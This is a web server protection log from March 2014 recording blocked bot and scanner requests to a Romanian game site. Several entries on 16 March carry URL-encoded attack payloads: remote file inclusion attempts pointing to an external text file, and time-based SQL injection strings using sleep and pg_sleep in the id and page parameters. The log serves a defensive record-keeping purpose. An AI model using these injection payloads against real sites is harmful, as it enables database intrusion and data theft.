11-03-2014 20:15:56 | Bots attack | IP: <redacted> ] | DNS: <redacted> | Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11 RPT-HTTPClient/0.3-3 | URL: /Inregistrare? | Referer: no referer

11-03-2014 21:53:02 | Bots attack | IP: <redacted> ] | DNS: <redacted> | Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11 RPT-HTTPClient/0.3-3 | URL: /index.php?page=schimbare-pw&amp;cod=a29ea49f6962429156630adaa9af326c | Referer: no referer

12-03-2014 07:11:44 | Bots attack | IP: <redacted> ] | DNS: <redacted> | Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11 RPT-HTTPClient/0.3-3 | URL: /index.php?page=alege | Referer: no referer

14-03-2014 07:50:41 | Bots attack | IP: <redacted> ] | DNS: <redacted> | Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11 RPT-HTTPClient/0.3-3 | URL: /Acasa? | Referer: no referer

15-03-2014 20:21:30 | Bots attack | IP: <redacted> ] | DNS: <redacted> | Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6 (FlipboardProxy/1.1; +http://flipboard.com/browserproxy) | URL: /index.php | Referer: no referer

16-03-2014 10:33:17 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0) | URL: /index.php?id=http%3a%2f%2ftestasp.vulnweb.com%2ft%2ffit.txt&page=jucatori | Referer: no referer

16-03-2014 10:33:22 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0) | URL: /index.php?id=http%3a%2f%2ftestasp.vulnweb.com%2ft%2ffit.txt&page=jucatori | Referer: no referer

16-03-2014 10:33:33 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0) | URL: /index.php?id=2%20and%20sleep%284.618%29%20&page=jucatori | Referer: no referer

16-03-2014 10:33:34 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0) | URL: /index.php?page=retea%27%20and%20sleep%284%29%3d%27 | Referer: no referer

16-03-2014 10:33:37 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0) | URL: /index.php?page=retea%27%20and%20%28sleep%284%29%2b1%29%20limit%201%20--%20 | Referer: no referer

16-03-2014 10:33:38 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0) | URL: /index.php?id=2%22%20and%20sleep%284.618%29%3d%22&page=jucatori | Referer: no referer

16-03-2014 10:33:39 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0) | URL: /index.php?page=retea%22%20and%20sleep%284%29%3d%22 | Referer: no referer

16-03-2014 10:33:45 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0) | URL: /index.php?id=2%3bselect%20pg_sleep%284.618%29%3b%20--%20&page=jucatori | Referer: no referer

16-03-2014 10:33:51 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0) | URL: /index.php?page=retea%20and%20sleep%284%29%20 | Referer: no referer

16-03-2014 10:33:55 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0) | URL: /index.php?page=retea%27%3bselect%20pg_sleep%284%29%3b%20--%20 | Referer: no referer

